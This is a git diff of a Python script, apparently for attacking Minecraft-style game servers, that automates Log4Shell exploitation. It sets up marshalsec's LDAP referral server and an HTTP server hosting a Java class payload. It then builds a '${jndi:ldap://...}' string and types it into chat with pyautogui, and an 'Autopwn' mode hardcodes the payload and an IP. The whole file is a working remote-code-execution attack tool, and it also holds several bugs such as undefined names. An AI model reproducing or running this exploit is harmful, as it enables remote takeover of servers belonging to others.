@@ -1,6 +1,9 @@
 import time
 import os
 import pyautogui
+import glob
+import asyncio
+
 print((("""
      ...                                                                                          ..       .. 
   .zf"` `"tu                                   xeee           .         .uef^"               x .d88"  x .d88"  
@@ -19,44 +22,88 @@ print((("""
                             ^"===*"`                      `~==R=~`        :"        by TheUnsocialEngineer                
 """)))
 
-start=input("press 1 to start or 2 to exit:")
 payload=()
+connectip=()
+connectport=()
+httport=()
+automatic=False
+
+if not os.path.exists("payloads"):
+    os.makedirs("payloads")
+if not os.path.exists("marshalsec"):
+    print("downloading marshalsec")
+    os.popen("git clone https://github.com/mbechler/marshalsec")
+else:
+    print("precs found skipping setup")
+
+
+def autorun():
+    if automatic==True:
+        async def refer():
+            print(f"starting referral server on {connectport}")
+            os.chdir("marshalsec/src")
+            os.popen(f'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{connectip}:{httport}/#{payload}"')
+        async def http():
+            print(f"starting http server on {httport}")
+            os.popen(f"python3 http.server {httport}")
+
+        asyncio.run(http())
+        asyncio.run(refer())
+            
+        time.sleep(5)
+        pyautogui.press("/")
+        pyautogui.press("backspace")
+        pyautogui.write(completedpayload)
+        pyautogui.press("enter")
+
+start=input("press 1 to start or 2 to exit:")
 if start=="1":
-    payselec=input("would you like to create a payload or use an existing one? n/e:")
-    os.chdir("payloads")
-    if payselec=="n":
-             filename=input("enter payload file name:")
-             filecont=input("enter payload here:")
-             f = open(filename, "w")
-             f.write(filecont)
-             f.close()
-             payload=(filename)
-             print("payload created.... continuing")
-             os.chdir("../")
-    else:
-        if payselec=="e":
-            dir_list = os.listdir(os.getcwd())
-            print(dir_list)
+    mode=input("Select Mode Manual/Autopwn, M/A:")
+    if mode =="M" or mode=="m":
+        os.chdir("payloads")
+        for file in glob.glob("*.class"):
+            print(file)
             choice=input("choose payload:")
-            payload=(choice)
+            payload=(choice.replace(".class",""))
             print(f"you have chosen {choice}.... continuing")
-             
-    connectip=input("enter your ip:")
-    connectport=input("enter connecting port:")
-    httport=input("enter the port to host the payload on:")
-    payloadstring=str(connectip+":"+connectport+"/"+payload)
-    completedpayload=("${jndi:ldap://"+payloadstring+"}")
-    print(f"your payload is {completedpayload}")
-    time.sleep(5)
-    pyautogui.press("/")
-    pyautogui.press("backspace")
-    pyautogui.write(completedpayload)
-    pyautogui.press("enter")
-    
-    
-             
-        
-  
-
-
-
+            connectip=input("enter your ip:")
+            connectport=input("enter connecting port:")
+            httport=input("enter the port to host the payload on:")
+            payloadstring=str(connectip+":"+connectport+"/"+payload)
+            completedpayload=("${jndi:ldap://"+payloadstring+"}")
+            print(f"your payload is {completedpayload}")
+            automate=input("do you want to automate the payload sending and setup Y/N:")
+            if automate =="Y" or automate=="y":
+                automatic=True
+                os.chdir("../")
+                autorun()
+            else:
+                if automate =="N" or mode=="n":
+                    automatic=False
+                    print("you wll manually need to setup the http and refer servers as well as send the payload in chat")   
+    else:
+        if mode=="A" or mode =="a":
+            os.chdir("payloads")
+            payload=("Log4jRCE")
+            print(f"setting payload to {payload}")
+            connectip=("192.168.1.183")
+            print(f"setting ip to {ip}")
+            connectport=("1389")
+            print(f"setting connection port to {connectport}")
+            httport=("8903")
+            print(f"setting httport to {httport}")
+            payloadstring=str(connectip+":"+connectport+"/"+payload)
+            completedpayload=("${jndi:ldap://"+payloadstring+"}")
+            print(f"your payload is {completedpayload}")
+            automatic=True
+            s.chdir("../")
+            autorun()
+        else:
+            print("not an option")
+            exit()
+else:
+    if start=="2":
+        exit()
+    else:
+        print("not an option")
+        exit()
